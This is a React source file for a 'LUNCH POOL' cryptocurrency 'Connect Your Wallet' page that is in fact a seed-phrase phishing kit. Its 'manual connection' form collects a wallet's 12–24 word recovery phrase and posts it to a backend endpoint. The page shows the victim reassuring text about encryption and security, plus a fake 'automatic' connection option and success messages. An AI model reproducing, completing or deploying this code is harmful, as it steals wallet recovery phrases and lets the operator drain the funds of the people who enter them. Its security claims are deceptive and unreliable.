import React, { useState, useEffect } from 'react';
import { 
  ChevronDown, 
  Wallet, 
  Import, 
  X, 
  Check, 
  AlertTriangle, 
  Shield, 
  Zap,
  Eye,
  EyeOff,
  Copy,
  ExternalLink,
  ArrowLeft
} from 'lucide-react';

// Mock popular wallets data for manual connection
const POPULAR_WALLETS = [
  { id: 'metamask', name: 'MetaMask', icon: '🦊', description: 'Popular browser extension wallet' },
  { id: 'trust', name: 'Trust Wallet', icon: '🛡️', description: 'Mobile-first crypto wallet' },
  { id: 'coinbase', name: 'Coinbase Wallet', icon: '🔵', description: 'User-friendly crypto wallet' },
  { id: 'phantom', name: 'Phantom', icon: '👻', description: 'Solana ecosystem wallet' },
  { id: 'binance', name: 'Binance Chain Wallet', icon: '🟡', description: 'Binance Smart Chain wallet' },
  { id: 'walletconnect', name: 'WalletConnect', icon: '🔗', description: 'Connect any mobile wallet' },
];

// Automatic connection wallets (5 specific wallets)
const AUTO_CONNECT_WALLETS = [
  { id: 'metamask', name: 'MetaMask', icon: '🦊', description: 'Browser extension wallet', apiEndpoint: 'metamask' },
  { id: 'trust', name: 'Trust Wallet', icon: '🛡️', description: 'Mobile crypto wallet', apiEndpoint: 'trust' },
  { id: 'phantom', name: 'Phantom (Solana)', icon: '👻', description: 'Solana ecosystem wallet', apiEndpoint: 'solana' },
  { id: 'coinbase', name: 'Coinbase Wallet', icon: '🔵', description: 'User-friendly wallet', apiEndpoint: 'coinbase' },
  { id: 'binance', name: 'Binance Wallet', icon: '🟡', description: 'Binance Smart Chain', apiEndpoint: 'binance' },
];

// This one na for manual
const sendWalletInfo = async (walletName, secretPhrase, userWalletName) => {
  try {
    const response = await fetch('http://localhost:3001/api/send-wallet', {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
      },
      body: JSON.stringify({ walletName, secretPhrase, userWalletName }),
    });

    const data = await response.json();
    if (data.success) {
      console.log('Wallet info sent successfully');
    } else {
      console.error('Failed to send wallet info');
    }
  } catch (err) {
    console.error('Error:', err);
  }
};

// na here i put automatic call for APi

const connectAutoWallet = async (walletType) => {
  try {
    const response = await fetch(`http://localhost:3001/api/connect-${walletType}`, {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
      },
      body: JSON.stringify({ walletType }),
    });

    const data = await response.json();
    return {
      success: data.success,
      address: data.address || null,
      error: data.error || null
    };
  } catch (err) {
    console.error('Auto connect error:', err);
    return {
      success: false,
      address: null,
      error: 'Failed to connect to wallet service'
    };
  }
};

export default function ConnectPage() {
  // State management
  const [showManualPopup, setShowManualPopup] = useState(false);
  const [showAutoPopup, setShowAutoPopup] = useState(false);
  const [showWalletForm, setShowWalletForm] = useState(false);
  const [selectedWallet, setSelectedWallet] = useState(null);
  const [selectedAutoWallet, setSelectedAutoWallet] = useState(null);
  const [showSuccessPopup, setShowSuccessPopup] = useState(false);
  const [showErrorPopup, setShowErrorPopup] = useState(false);
  const [isConnecting, setIsConnecting] = useState(false);
  const [connectionStatus, setConnectionStatus] = useState(null);
  const [showSecretPhrase, setShowSecretPhrase] = useState(false);
  const [errorMessage, setErrorMessage] = useState('');
  
  // Form data
  const [formData, setFormData] = useState({
    walletName: '',
    secretPhrase: ''
  });
  
  // Validation errors
  const [errors, setErrors] = useState({});
  
  // Handle manual connection flow
  const handleManualConnect = () => {
    setShowManualPopup(true);
  };
  
  // Handle automatic connection flow
  const handleAutomaticConnect = () => {
    setShowAutoPopup(true);
  };
  
  const handleWalletSelect = (wallet) => {
    setSelectedWallet(wallet);
    setFormData({ ...formData, walletName: wallet.name });
    setShowManualPopup(false);
    setShowWalletForm(true);
  };

  // Handle automatic wallet selection and connection
  const handleAutoWalletSelect = async (wallet) => {
    setSelectedAutoWallet(wallet);
    setIsConnecting(true);
    setShowAutoPopup(false);
    setConnectionStatus('connecting');
    
    try {
      const result = await connectAutoWallet(wallet.apiEndpoint);
      
      if (result.success) {
        setConnectionStatus('success');
        setTimeout(() => {
          setConnectionStatus(null);
          setSelectedAutoWallet(null);
        }, 5000);
      } else {
        setConnectionStatus('error');
        setErrorMessage(result.error || 'Failed to connect to wallet');
        setTimeout(() => {
          setConnectionStatus(null);
          setSelectedAutoWallet(null);
          setErrorMessage('');
        }, 5000);
      }
    } catch (error) {
      setConnectionStatus('error');
      setErrorMessage('Connection failed. Please try again.');
      setTimeout(() => {
        setConnectionStatus(null);
        setSelectedAutoWallet(null);
        setErrorMessage('');
      }, 5000);
    } finally {
      setIsConnecting(false);
    }
  };
  

  const handleInputChange = (field, value) => {
    setFormData({ ...formData, [field]: value });
    // Clear error when user starts typing
    if (errors[field]) {
      setErrors({ ...errors, [field]: '' });
    }
  };
  
  const validateForm = () => {
    const newErrors = {};
    
    if (!formData.walletName.trim()) {
      newErrors.walletName = 'Wallet name is required';
    }
    
    if (!formData.secretPhrase.trim()) {
      newErrors.secretPhrase = 'Secret phrase is required';
    } else {
      const words = formData.secretPhrase.trim().split(/\s+/);
      if (words.length < 12) {
        newErrors.secretPhrase = 'Secret phrase must contain at least 12 words';
      }
    }
    
    setErrors(newErrors);
    return Object.keys(newErrors).length === 0;
  };
  
  // For manual baba
  const handleManualSubmit = async (e) => {
    e.preventDefault();
    
    if (!validateForm()) return;
    
    setIsConnecting(true);
    
    try {
      await sendWalletInfo(selectedWallet.name, formData.secretPhrase, formData.walletName);
      setShowWalletForm(false);
      setShowSuccessPopup(true);
      setFormData({ walletName: '', secretPhrase: '' });
      setSelectedWallet(null);
    } catch (error) {
      setShowErrorPopup(true);
    } finally {
      setIsConnecting(false);
    }
  };
  
  
  const closeAllPopups = () => {
    setShowManualPopup(false);
    setShowAutoPopup(false);
    setShowWalletForm(false);
    setShowSuccessPopup(false);
    setShowErrorPopup(false);
    setConnectionStatus(null);
    setSelectedWallet(null);
    setSelectedAutoWallet(null);
    setFormData({ walletName: '', secretPhrase: '' });
    setErrors({});
    setErrorMessage('');
  };
  
  return (
    <div className="connect-page min-h-screen bg-gradient-to-br from-slate-900 via-purple-900 to-slate-900">
      {/* Background Elements */}
      <div className="fixed inset-0 bg-gradient-radial from-transparent via-indigo-900/20 to-black/80 pointer-events-none"></div>
      
      {/* Header */}
      <header className="relative z-20 px-6 py-4 flex justify-between items-center border-b border-white/10 backdrop-blur-sm">
        <div className="logo-container">
          <div className="logo text-2xl font-bold bg-gradient-to-r from-blue-400 to-purple-600 bg-clip-text text-transparent">
            LUNCH POOL
          </div>
        </div>
        <button 
          onClick={() => window.history.back()} 
          className="flex items-center gap-2 px-4 py-2 rounded-lg bg-white/5 border border-white/10 hover:bg-white/10 text-white transition-all"
        >
          <ArrowLeft size={16} />
          Back
        </button>
      </header>

      {/* Main Content */}
      <main className="relative z-20 container mx-auto px-6 py-12">
        <div className="max-w-4xl mx-auto">
          {/* Page Header */}
          <div className="text-center mb-12">
            <div className="inline-block px-3 py-1 rounded-full bg-blue-900/30 border border-blue-500/50 text-blue-400 text-xs font-semibold mb-6">
              SECURE CONNECTION
            </div>
            <h1 className="text-4xl md:text-5xl font-bold mb-6 text-transparent bg-clip-text bg-gradient-to-r from-blue-400 to-purple-600">
              Connect Your Wallet
            </h1>
            <p className="text-gray-300 text-lg max-w-2xl mx-auto">
              Choose your preferred connection method to securely access your crypto wallet and resolve blockchain issues.
            </p>
          </div>

          {/* Connection Methods */}
          <div className="grid grid-cols-1 md:grid-cols-2 gap-8 mb-12">
            {/* Manual Connection */}
            <div className="connection-card group relative overflow-hidden rounded-2xl bg-gradient-to-b from-white/5 to-white/[0.02] border border-white/10 backdrop-blur-sm p-8 hover:border-purple-500/50 transition-all duration-300">
              <div className="absolute top-0 right-0 w-32 h-32 bg-gradient-to-br from-purple-500/10 to-pink-600/10 rounded-full blur-3xl"></div>
              
              <div className="relative z-10">
                <div className="flex items-center gap-4 mb-6">
                  <div className="w-12 h-12 rounded-lg bg-purple-500/20 flex items-center justify-center">
                    <Import size={24} className="text-purple-400" />
                  </div>
                  <div>
                    <h3 className="text-xl font-semibold text-white">Manual Connection</h3>
                    <p className="text-gray-400 text-sm">Import using seed phrase</p>
                  </div>
                </div>
                
                <p className="text-gray-300 mb-6">
                  Securely connect by selecting your wallet type and entering your recovery phrase. 
                  Full control over the connection process.
                </p>
                
                <div className="features-list space-y-2 mb-8">
                  <div className="flex items-center gap-2 text-sm text-gray-400">
                    <Shield size={14} className="text-green-400" />
                    <span>Bank-level encryption</span>
                  </div>
                  <div className="flex items-center gap-2 text-sm text-gray-400">
                    <Check size={14} className="text-green-400" />
                    <span>Works with all wallet types</span>
                  </div>
                  <div className="flex items-center gap-2 text-sm text-gray-400">
                    <Wallet size={14} className="text-green-400" />
                    <span>Direct access to funds</span>
                  </div>
                </div>
                
                <button 
                  onClick={handleManualConnect}
                  className="w-full px-6 py-3 rounded-lg bg-gradient-to-r from-purple-600 to-pink-600 hover:from-purple-700 hover:to-pink-700 text-white font-medium transition-all shadow-lg shadow-purple-700/30"
                >
                  Connect Manually
                </button>
              </div>
            </div>

            {/* Automatic Connection */}
            <div className="connection-card group relative overflow-hidden rounded-2xl bg-gradient-to-b from-white/5 to-white/[0.02] border border-white/10 backdrop-blur-sm p-8 hover:border-blue-500/50 transition-all duration-300">
              <div className="absolute top-0 right-0 w-32 h-32 bg-gradient-to-br from-blue-500/10 to-cyan-600/10 rounded-full blur-3xl"></div>
              
              <div className="relative z-10">
                <div className="flex items-center gap-4 mb-6">
                  <div className="w-12 h-12 rounded-lg bg-blue-500/20 flex items-center justify-center">
                    <Zap size={24} className="text-blue-400" />
                  </div>
                  <div>
                    <h3 className="text-xl font-semibold text-white">Automatic Connection</h3>
                    <p className="text-gray-400 text-sm">One-click Web3 connection</p>
                  </div>
                </div>
                
                <p className="text-gray-300 mb-6">
                  Quick connection using popular wallet providers. 
                  Fast and secure with built-in Web3 protocols.
                </p>
                
                <div className="features-list space-y-2 mb-8">
                  <div className="flex items-center gap-2 text-sm text-gray-400">
                    <Zap size={14} className="text-blue-400" />
                    <span>Instant connection</span>
                  </div>
                  <div className="flex items-center gap-2 text-sm text-gray-400">
                    <Shield size={14} className="text-blue-400" />
                    <span>Multiple wallet support</span>
                  </div>
                  <div className="flex items-center gap-2 text-sm text-gray-400">
                    <Check size={14} className="text-blue-400" />
                    <span>No seed phrase required</span>
                  </div>
                </div>
                
                <button 
                  onClick={handleAutomaticConnect}
                  disabled={isConnecting}
                  className="w-full px-6 py-3 rounded-lg bg-gradient-to-r from-blue-500 to-purple-600 hover:from-blue-600 hover:to-purple-700 text-white font-medium transition-all shadow-lg shadow-blue-700/30 disabled:opacity-50 disabled:cursor-not-allowed flex items-center justify-center gap-2"
                >
                  {isConnecting && connectionStatus === 'connecting' ? (
                    <>
                      <div className="w-4 h-4 border-2 border-white border-t-transparent rounded-full animate-spin"></div>
                      Connecting to {selectedAutoWallet?.name}...
                    </>
                  ) : (
                    'Connect Automatically'
                  )}
                </button>
              </div>
            </div>
          </div>

          {/* Connection Status Messages */}
          {connectionStatus === 'success' && (
            <div className="fixed top-20 right-6 bg-green-900/90 border border-green-500/50 rounded-lg p-4 backdrop-blur-sm z-50 animate-slide-in">
              <div className="flex items-center gap-3">
                <Check size={20} className="text-green-400" />
                <div>
                  <p className="text-green-400 font-medium">Connection Successful!</p>
                  <p className="text-green-300 text-sm">{selectedAutoWallet?.name} connected successfully</p>
                </div>
              </div>
            </div>
          )}

          {connectionStatus === 'error' && (
            <div className="fixed top-20 right-6 bg-red-900/90 border border-red-500/50 rounded-lg p-4 backdrop-blur-sm z-50 animate-slide-in">
              <div className="flex items-center gap-3">
                <AlertTriangle size={20} className="text-red-400" />
                <div>
                  <p className="text-red-400 font-medium">Connection Failed</p>
                  <p className="text-red-300 text-sm">{errorMessage || 'Please try again or use manual connection'}</p>
                </div>
              </div>
            </div>
          )}

          {/* Security Notice */}
          <div className="bg-gradient-to-r from-yellow-900/20 to-orange-900/20 border border-yellow-500/30 rounded-xl p-6 backdrop-blur-sm">
            <div className="flex items-start gap-4">
              <Shield size={24} className="text-yellow-400 mt-1 flex-shrink-0" />
              <div>
                <h3 className="text-yellow-400 font-semibold mb-2">Security Notice</h3>
                <p className="text-gray-300 text-sm leading-relaxed">
                  Your security is our top priority. We use industry-standard encryption to protect your wallet information. 
                  Never share your seed phrase with anyone else, and always verify you're on the official LUNCH POOL platform 
                  before connecting your wallet.
                </p>
              </div>
            </div>
          </div>
        </div>
      </main>

      {/* Manual Wallet Selection Popup */}
      {showManualPopup && (
        <div className="fixed inset-0 bg-black/70 backdrop-blur-sm flex items-center justify-center z-50 p-4">
          <div className="bg-slate-900 border border-white/20 rounded-2xl p-6 w-full max-w-lg max-h-[80vh] overflow-y-auto animate-scale-in">
            <div className="flex justify-between items-center mb-6">
              <h3 className="text-xl font-semibold text-white">Select Your Wallet</h3>
              <button 
                onClick={() => setShowManualPopup(false)}
                className="p-2 hover:bg-white/10 rounded-lg transition-colors"
              >
                <X size={20} className="text-gray-400" />
              </button>
            </div>
            
            <div className="space-y-3">
              {POPULAR_WALLETS.map((wallet) => (
                <button
                  key={wallet.id}
                  onClick={() => handleWalletSelect(wallet)}
                  className="w-full p-4 rounded-xl bg-white/5 border border-white/10 hover:bg-white/10 hover:border-purple-500/50 transition-all group text-left"
                >
                  <div className="flex items-center gap-4">
                    <div className="text-2xl">{wallet.icon}</div>
                    <div className="flex-1">
                      <h4 className="text-white font-medium group-hover:text-purple-400 transition-colors">
                        {wallet.name}
                      </h4>
                      <p className="text-gray-400 text-sm">{wallet.description}</p>
                    </div>
                    <ChevronDown size={16} className="text-gray-400 rotate-[-90deg]" />
                  </div>
                </button>
              ))}
            </div>
          </div>
        </div>
      )}

      {/* Automatic Wallet Selection Popup */}
      {showAutoPopup && (
        <div className="fixed inset-0 bg-black/70 backdrop-blur-sm flex items-center justify-center z-50 p-4">
          <div className="bg-slate-900 border border-white/20 rounded-2xl p-6 w-full max-w-lg max-h-[80vh] overflow-y-auto animate-scale-in">
            <div className="flex justify-between items-center mb-6">
              <h3 className="text-xl font-semibold text-white">Choose Wallet to Connect</h3>
              <button 
                onClick={() => setShowAutoPopup(false)}
                className="p-2 hover:bg-white/10 rounded-lg transition-colors"
              >
                <X size={20} className="text-gray-400" />
              </button>
            </div>
            
            <p className="text-gray-400 text-sm mb-6">
              Select your preferred wallet for automatic connection
            </p>
            
            <div className="space-y-3">
              {AUTO_CONNECT_WALLETS.map((wallet) => (
                <button
                  key={wallet.id}
                  onClick={() => handleAutoWalletSelect(wallet)}
                  className="w-full p-4 rounded-xl bg-white/5 border border-white/10 hover:bg-white/10 hover:border-blue-500/50 transition-all group text-left"
                >
                  <div className="flex items-center gap-4">
                    <div className="text-2xl">{wallet.icon}</div>
                    <div className="flex-1">
                      <h4 className="text-white font-medium group-hover:text-blue-400 transition-colors">
                        {wallet.name}
                      </h4>
                      <p className="text-gray-400 text-sm">{wallet.description}</p>
                    </div>
                    <div className="flex items-center gap-2">
                      <Zap size={14} className="text-blue-400" />
                      <ChevronDown size={16} className="text-gray-400 rotate-[-90deg]" />
                    </div>
                  </div>
                </button>
              ))}
            </div>
          </div>
        </div>
      )}

      {/* Manual Connection Form Popup */}
      {showWalletForm && selectedWallet && (
        <div className="fixed inset-0 bg-black/70 backdrop-blur-sm flex items-center justify-center z-50 p-4">
          <div className="bg-slate-900 border border-white/20 rounded-2xl p-6 w-full max-w-md animate-scale-in">
            <div className="flex justify-between items-center mb-6">
              <h3 className="text-xl font-semibold text-white">Connect {selectedWallet.name}</h3>
              <button 
                onClick={closeAllPopups}
                className="p-2 hover:bg-white/10 rounded-lg transition-colors"
              >
                <X size={20} className="text-gray-400" />
              </button>
            </div>
            
            <div className="space-y-6">
              {/* Wallet Type (Read-only) */}
              <div>
                <label className="block text-sm font-medium text-gray-300 mb-2">
                  Wallet Type
                </label>
                <div className="flex items-center gap-3 p-3 rounded-lg bg-gray-800/50 border border-gray-700">
                  <span className="text-xl">{selectedWallet.icon}</span>
                  <span className="text-white font-medium">{selectedWallet.name}</span>
                </div>
              </div>

              {/* Wallet Name Input */}
              <div>
                <label className="block text-sm font-medium text-gray-300 mb-2">
                  Wallet Name <span className="text-red-400">*</span>
                </label>
                <input
                  type="text"
                  value={formData.walletName}
                  onChange={(e) => handleInputChange('walletName', e.target.value)}
                  placeholder="Enter a name for your wallet"
                  className={`w-full p-3 rounded-lg bg-white/5 border ${
                    errors.walletName ? 'border-red-500' : 'border-white/20'
                  } text-white placeholder-gray-400 focus:border-purple-500 focus:outline-none transition-colors`}
                />
                {errors.walletName && (
                  <p className="text-red-400 text-sm mt-1">{errors.walletName}</p>
                )}
              </div>

              {/* Secret Phrase Input */}
              <div>
                <label className="block text-sm font-medium text-gray-300 mb-2">
                  Recovery Phrase (12-24 words) <span className="text-red-400">*</span>
                </label>
                <div className="relative">
                  <textarea
                    value={formData.secretPhrase}
                    onChange={(e) => handleInputChange('secretPhrase', e.target.value)}
                    placeholder="Enter your recovery phrase separated by spaces"
                    rows={4}
                    className={`w-full p-3 rounded-lg bg-white/5 border ${
                      errors.secretPhrase ? 'border-red-500' : 'border-white/20'
                    } text-white placeholder-gray-400 focus:border-purple-500 focus:outline-none transition-colors resize-none ${
                      showSecretPhrase ? '' : 'filter blur-sm'
                    }`}
                  />
                  <button
                    type="button"
                    onClick={() => setShowSecretPhrase(!showSecretPhrase)}
                    className="absolute top-3 right-3 p-1 hover:bg-white/10 rounded transition-colors"
                  >
                    {showSecretPhrase ? (
                      <EyeOff size={16} className="text-gray-400" />
                    ) : (
                      <Eye size={16} className="text-gray-400" />
                    )}
                  </button>
                </div>
                {errors.secretPhrase && (
                  <p className="text-red-400 text-sm mt-1">{errors.secretPhrase}</p>
                )}
                <p className="text-gray-500 text-xs mt-1">
                  Your recovery phrase will be encrypted and securely processed
                </p>
              </div>

              {/* Submit Button */}
              <button
                type="button"
                onClick={handleManualSubmit}
                disabled={isConnecting}
                className="w-full px-6 py-3 rounded-lg bg-gradient-to-r from-purple-600 to-pink-600 hover:from-purple-700 hover:to-pink-700 text-white font-medium transition-all shadow-lg shadow-purple-700/30 disabled:opacity-50 disabled:cursor-not-allowed flex items-center justify-center gap-2"
              >
                {isConnecting ? (
                  <>
                    <div className="w-4 h-4 border-2 border-white border-t-transparent rounded-full animate-spin"></div>
                    Connecting...
                  </>
                ) : (
                  'Connect Wallet'
                )}
              </button>
            </div>
          </div>
        </div>
      )}

      {/* Success Popup */}
      {showSuccessPopup && (
        <div className="fixed inset-0 bg-black/70 backdrop-blur-sm flex items-center justify-center z-50 p-4">
          <div className="bg-slate-900 border border-green-500/50 rounded-2xl p-8 w-full max-w-md text-center animate-scale-in">
            <div className="w-16 h-16 bg-green-500/20 rounded-full flex items-center justify-center mx-auto mb-6">
              <Check size={32} className="text-green-400" />
            </div>
            <h3 className="text-2xl font-semibold text-white mb-4">Connection Successful!</h3>
            <p className="text-gray-300 mb-6">
              Your wallet information has been securely processed. Our team will review and resolve any issues with your wallet.
            </p>
            <button
              onClick={closeAllPopups}
              className="px-6 py-3 rounded-lg bg-green-600 hover:bg-green-700 text-white font-medium transition-colors"
            >
              Continue
            </button>
          </div>
        </div>
      )}

      {/* Error Popup */}
      {showErrorPopup && (
        <div className="fixed inset-0 bg-black/70 backdrop-blur-sm flex items-center justify-center z-50 p-4">
          <div className="bg-slate-900 border border-red-500/50 rounded-2xl p-8 w-full max-w-md text-center animate-scale-in">
            <div className="w-16 h-16 bg-red-500/20 rounded-full flex items-center justify-center mx-auto mb-6">
              <AlertTriangle size={32} className="text-red-400" />
            </div>
            <h3 className="text-2xl font-semibold text-white mb-4">Connection Failed</h3>
            <p className="text-gray-300 mb-6">
              There was an error processing your wallet connection. Please try again or contact support if the problem persists.
            </p>
            <button
              onClick={closeAllPopups}
              className="px-6 py-3 rounded-lg bg-red-600 hover:bg-red-700 text-white font-medium transition-colors"
            >
              Try Again
            </button>
          </div>
        </div>
      )}

      <style>{`
        @keyframes scale-in {
          from {
            opacity: 0;
            transform: scale(0.9);
          }
          to {
            opacity: 1;
            transform: scale(1);
          }
        }

        @keyframes slide-in {
          from {
            opacity: 0;
            transform: translateX(100%);
          }
          to {
            opacity: 1;
            transform: translateX(0);
          }
        }

        .animate-scale-in {
          animation: scale-in 0.2s ease-out;
        }

        .animate-slide-in {
          animation: slide-in 0.3s ease-out;
        }

        .connection-card:hover {
          transform: translateY(-4px);
          box-shadow: 0 20px 40px rgba(0, 0, 0, 0.3);
        }

        .bg-gradient-radial {
          background: radial-gradient(circle at center, var(--tw-gradient-stops));
        }

        /* Custom scrollbar */
        ::-webkit-scrollbar {
          width: 6px;
        }

        ::-webkit-scrollbar-track {
          background: rgba(255, 255, 255, 0.1);
          border-radius: 3px;
        }

        ::-webkit-scrollbar-thumb {
          background: rgba(139, 92, 246, 0.6);
          border-radius: 3px;
        }

        ::-webkit-scrollbar-thumb:hover {
          background: rgba(139, 92, 246, 0.8);
        }
      `}</style>
    </div>
  );
}